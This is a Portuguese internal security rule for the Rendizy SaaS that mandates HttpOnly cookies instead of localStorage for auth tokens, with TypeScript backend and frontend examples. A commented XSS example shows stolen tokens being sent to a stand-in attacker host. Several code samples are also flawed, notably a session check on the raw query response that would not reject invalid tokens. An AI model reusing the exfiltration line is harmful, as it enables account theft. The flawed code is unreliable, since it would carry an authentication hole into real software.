# 🔐 REGRA: Autenticação e Gerenciamento de Tokens

**Versão:** v1.0.103.980  
**Data:** 20/11/2025  
**Status:** ✅ **REGRA OBRIGATÓRIA**  
**Contexto:** SaaS Público em Escala

---

## 🎯 PRINCÍPIO GERAL

**REGRA DE OURO:**
> **Para SaaS público em escala:  
> Use Cookies HttpOnly para tokens.  
> NUNCA use localStorage para tokens em produção.**

---

## 🚨 **CONTEXTO: RENDIZY É SAAS PÚBLICO**

### **Características do Sistema:**
- ✅ **Público e Comercial** - Acessível a qualquer cliente
- ✅ **Multi-Tenant** - Múltiplas organizações isoladas
- ✅ **Escala** - Precisa suportar milhares de usuários
- ✅ **Segurança Crítica** - Dados sensíveis de clientes
- ✅ **Conformidade** - Deve seguir padrões de segurança

### **Por que isso importa:**
- 🔴 **XSS é risco real** em sistemas públicos
- 🔴 **Escala = mais alvos** para ataques
- 🔴 **Multi-tenant = isolamento crítico**
- 🔴 **Compliance** pode exigir cookies HttpOnly

---

## ❌ **NUNCA USE localStorage PARA TOKENS EM PRODUÇÃO:**

### 1. **Vulnerabilidade XSS (Cross-Site Scripting)**
```typescript
// ❌ PERIGOSO: Token acessível via JavaScript
localStorage.setItem('rendizy-token', token);
// Script malicioso pode fazer:
// const token = localStorage.getItem('rendizy-token');
// fetch('https://atacante.com/steal', { body: token });
```

**Risco:**
- Script injetado pode roubar token
- Token pode ser usado para acessar conta
- Dados de múltiplos tenants comprometidos

### 2. **Não escala bem**
```typescript
// ❌ PROBLEMA: Token em cada requisição manualmente
const token = localStorage.getItem('rendizy-token');
fetch(url, {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

**Problemas:**
- Código repetitivo em cada requisição
- Fácil esquecer de adicionar token
- Não funciona em requisições automáticas (img, link, etc)
- Difícil de gerenciar em escala

### 3. **Não tem proteção automática**
- ❌ Não expira automaticamente (precisa gerenciar manualmente)
- ❌ Não é enviado automaticamente (precisa código manual)
- ❌ Não tem proteção CSRF nativa
- ❌ Não funciona entre subdomínios facilmente

---

## ✅ **USE COOKIES HTTPONLY PARA TOKENS:**

### **1. Proteção contra XSS**
```typescript
// ✅ SEGURO: Cookie HttpOnly não é acessível via JavaScript
// Backend define cookie:
Set-Cookie: rendizy-token=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=86400

// Frontend NÃO pode acessar:
// document.cookie // ❌ Não contém rendizy-token (HttpOnly)
```

**Vantagens:**
- ✅ JavaScript não pode ler o cookie
- ✅ Proteção automática contra XSS
- ✅ Navegador gerencia automaticamente

### **2. Escala e Performance**
```typescript
// ✅ AUTOMÁTICO: Navegador envia cookie em todas as requisições
fetch('/api/data'); // Cookie enviado automaticamente
```

**Vantagens:**
- ✅ Envio automático pelo navegador
- ✅ Menos código no frontend
- ✅ Funciona em todas as requisições (fetch, img, link, etc)
- ✅ Melhor performance (menos código)

### **3. Segurança Avançada**
```typescript
// ✅ CONFIGURAÇÃO SEGURA:
Set-Cookie: 
  rendizy-token=abc123;
  HttpOnly;           // ✅ Não acessível via JavaScript
  Secure;            // ✅ Apenas HTTPS
  SameSite=Strict;   // ✅ Proteção CSRF
  Max-Age=86400;     // ✅ Expiração automática
  Path=/;            // ✅ Escopo do cookie
```

**Proteções:**
- ✅ **HttpOnly** - Proteção XSS
- ✅ **Secure** - Apenas HTTPS
- ✅ **SameSite** - Proteção CSRF
- ✅ **Max-Age** - Expiração automática

---

## 🏗️ **ARQUITETURA RECOMENDADA**

### **Backend (Supabase Edge Functions):**

```typescript
// ✅ CORRETO: Definir cookie HttpOnly após login
app.post('/auth/login', async (c) => {
  // ... validação de credenciais ...
  
  const token = generateToken();
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24h
  
  // Salvar sessão no SQL
  await supabase.from('sessions').insert({
    token,
    user_id: user.id,
    organization_id: user.organization_id,
    expires_at: expiresAt.toISOString()
  });
  
  // ✅ Definir cookie HttpOnly
  c.header('Set-Cookie', 
    `rendizy-token=${token}; ` +
    `HttpOnly; ` +
    `Secure; ` +
    `SameSite=Strict; ` +
    `Max-Age=86400; ` +
    `Path=/`
  );
  
  return c.json({ success: true, user });
});
```

### **Frontend (React):**

```typescript
// ✅ CORRETO: Não armazenar token, apenas usar
// O navegador envia cookie automaticamente

// Login
const response = await fetch('/auth/login', {
  method: 'POST',
  body: JSON.stringify({ username, password }),
  credentials: 'include' // ✅ Importante para cookies
});

// Requisições subsequentes
const data = await fetch('/api/data', {
  credentials: 'include' // ✅ Cookie enviado automaticamente
});
```

### **Middleware de Autenticação:**

```typescript
// ✅ CORRETO: Ler token do cookie (não do header)
app.use('*', async (c, next) => {
  const token = c.req.cookie('rendizy-token');
  
  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  
  // Validar token no SQL
  const session = await supabase
    .from('sessions')
    .select('*, users(*), organizations(*)')
    .eq('token', token)
    .eq('expires_at', '>', new Date().toISOString())
    .single();
  
  if (!session) {
    return c.json({ error: 'Invalid session' }, 401);
  }
  
  // Adicionar contexto ao request
  c.set('user', session.users);
  c.set('organization', session.organizations);
  
  await next();
});
```

---

## 📋 **CHECKLIST DE MIGRAÇÃO**

### **Fase 1: Preparação (Backend)**
- [ ] Atualizar rota `/auth/login` para definir cookie HttpOnly
- [ ] Atualizar middleware para ler token do cookie
- [ ] Adicionar `credentials: 'include'` em todas as rotas
- [ ] Testar logout (limpar cookie)
- [ ] Testar expiração de sessão

### **Fase 2: Migração Frontend**
- [ ] Remover `localStorage.setItem('rendizy-token')`
- [ ] Remover `localStorage.getItem('rendizy-token')`
- [ ] Adicionar `credentials: 'include'` em todas as requisições
- [ ] Atualizar `AuthContext` para não usar localStorage
- [ ] Testar login/logout
- [ ] Testar refresh de página

### **Fase 3: Validação**
- [ ] Testar proteção XSS (tentar ler cookie via JavaScript)
- [ ] Testar proteção CSRF (SameSite)
- [ ] Testar expiração automática
- [ ] Testar múltiplas abas
- [ ] Testar logout em todas as abas

---

## 🔒 **REGRAS DE CÓDIGO**

### **1. NUNCA use localStorage para tokens**

```typescript
// ❌ ERRADO:
localStorage.setItem('rendizy-token', token);
const token = localStorage.getItem('rendizy-token');

// ✅ CORRETO:
// Backend define cookie HttpOnly
// Frontend não acessa token diretamente
```

### **2. SEMPRE use credentials: 'include'**

```typescript
// ❌ ERRADO:
fetch('/api/data'); // Cookie não é enviado

// ✅ CORRETO:
fetch('/api/data', {
  credentials: 'include' // Cookie enviado automaticamente
});
```

### **3. SEMPRE valide token no backend**

```typescript
// ✅ CORRETO: Validar sempre
app.use('*', async (c, next) => {
  const token = c.req.cookie('rendizy-token');
  if (!token || !await validateToken(token)) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  await next();
});
```

---

## 🚨 **PADRÕES PERIGOSOS**

### **❌ NUNCA FAÇA:**

```typescript
// ❌ Token em localStorage
localStorage.setItem('rendizy-token', token);

// ❌ Token em sessionStorage (ainda vulnerável)
sessionStorage.setItem('rendizy-token', token);

// ❌ Cookie sem HttpOnly
Set-Cookie: rendizy-token=abc123; // ❌ Acessível via JavaScript

// ❌ Token em variável global
window.token = token; // ❌ Extremamente perigoso

// ❌ Token em URL
fetch(`/api/data?token=${token}`); // ❌ Expõe token em logs
```

### **✅ SEMPRE FAÇA:**

```typescript
// ✅ Cookie HttpOnly
Set-Cookie: rendizy-token=abc123; HttpOnly; Secure; SameSite=Strict;

// ✅ Credentials include
fetch('/api/data', { credentials: 'include' });

// ✅ Validação no backend
const token = c.req.cookie('rendizy-token');
await validateToken(token);

// ✅ Logout limpa cookie
Set-Cookie: rendizy-token=; Max-Age=0; Path=/;
```

---

## 📊 **COMPARAÇÃO: localStorage vs Cookies HttpOnly**

| Recurso | localStorage | Cookies HttpOnly |
|---------|--------------|------------------|
| **Proteção XSS** | ❌ Não | ✅ Sim |
| **Proteção CSRF** | ❌ Não | ✅ Sim (SameSite) |
| **Envio automático** | ❌ Não | ✅ Sim |
| **Expiração automática** | ❌ Não | ✅ Sim |
| **Escala** | ⚠️ Média | ✅ Excelente |
| **SaaS Público** | ❌ Não recomendado | ✅ Recomendado |
| **Complexidade** | ✅ Baixa | ⚠️ Média |

---

## 🎯 **PLANO DE AÇÃO IMEDIATO**

### **Prioridade ALTA (Fazer agora):**

1. ✅ **Criar esta regra** (este documento)
2. ✅ **Planejar migração** para cookies HttpOnly
3. ✅ **Atualizar backend** para definir cookies
4. ✅ **Atualizar frontend** para usar cookies
5. ✅ **Testar segurança** (XSS, CSRF)

### **Prioridade MÉDIA (Próxima sprint):**

1. ⚠️ **Implementar refresh tokens** (se necessário)
2. ⚠️ **Adicionar rate limiting** por token
3. ⚠️ **Implementar revogação de tokens**
4. ⚠️ **Adicionar logging de segurança**

### **Prioridade BAIXA (Futuro):**

1. 📋 **Considerar OAuth2/OIDC** (se necessário)
2. 📋 **Implementar 2FA** (se necessário)
3. 📋 **Adicionar device fingerprinting** (se necessário)

---

## 🔧 **IMPLEMENTAÇÃO TÉCNICA**

### **Backend: Definir Cookie HttpOnly**

```typescript
// supabase/functions/rendizy-server/routes-auth.ts

app.post('/auth/login', async (c) => {
  // ... validação ...
  
  const token = generateToken();
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);
  
  // Salvar sessão
  await supabase.from('sessions').insert({
    token,
    user_id: user.id,
    organization_id: user.organization_id,
    expires_at: expiresAt.toISOString()
  });
  
  // ✅ Definir cookie HttpOnly
  const cookieValue = [
    `rendizy-token=${token}`,
    'HttpOnly',
    'Secure',
    'SameSite=Strict',
    `Max-Age=86400`,
    'Path=/'
  ].join('; ');
  
  c.header('Set-Cookie', cookieValue);
  
  return c.json({ success: true, user });
});
```

### **Backend: Ler Token do Cookie**

```typescript
// supabase/functions/rendizy-server/index.ts

app.use('*', async (c, next) => {
  // ✅ Ler token do cookie
  const cookieHeader = c.req.header('Cookie') || '';
  const cookies = parseCookies(cookieHeader);
  const token = cookies['rendizy-token'];
  
  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  
  // Validar token
  const session = await supabase
    .from('sessions')
    .select('*, users(*), organizations(*)')
    .eq('token', token)
    .gt('expires_at', new Date().toISOString())
    .single();
  
  if (!session) {
    return c.json({ error: 'Invalid session' }, 401);
  }
  
  c.set('user', session.users);
  c.set('organization', session.organizations);
  
  await next();
});

function parseCookies(cookieHeader: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  cookieHeader.split(';').forEach(cookie => {
    const [key, value] = cookie.trim().split('=');
    if (key && value) {
      cookies[key] = decodeURIComponent(value);
    }
  });
  return cookies;
}
```

### **Frontend: Usar Cookies**

```typescript
// src/contexts/AuthContext.tsx

// ❌ REMOVER:
// localStorage.setItem('rendizy-token', token);
// const token = localStorage.getItem('rendizy-token');

// ✅ USAR:
// Token é gerenciado automaticamente pelo navegador
// Apenas garantir credentials: 'include'

const login = async (username: string, password: string) => {
  const response = await fetch('/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
    credentials: 'include' // ✅ Importante!
  });
  
  // Cookie é definido automaticamente pelo backend
  // Não precisa salvar em localStorage
};

const logout = async () => {
  await fetch('/auth/logout', {
    method: 'POST',
    credentials: 'include' // ✅ Cookie é limpo pelo backend
  });
};
```

---

## 📚 **REFERÊNCIAS**

- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## ✅ **VALIDAÇÃO**

### **Teste de Segurança XSS:**

```javascript
// Tentar ler cookie via JavaScript (deve falhar)
console.log(document.cookie); // ❌ Não deve conter rendizy-token
```

### **Teste de Proteção CSRF:**

```javascript
// Tentar fazer requisição cross-site (deve falhar com SameSite=Strict)
fetch('https://outro-dominio.com/api', {
  credentials: 'include'
}); // ❌ Cookie não deve ser enviado
```

---

**VERSÃO:** v1.0.103.980  
**DATA:** 20/11/2025  
**STATUS:** ✅ **REGRA OBRIGATÓRIA**  
**CONTEXTO:** SaaS Público em Escala

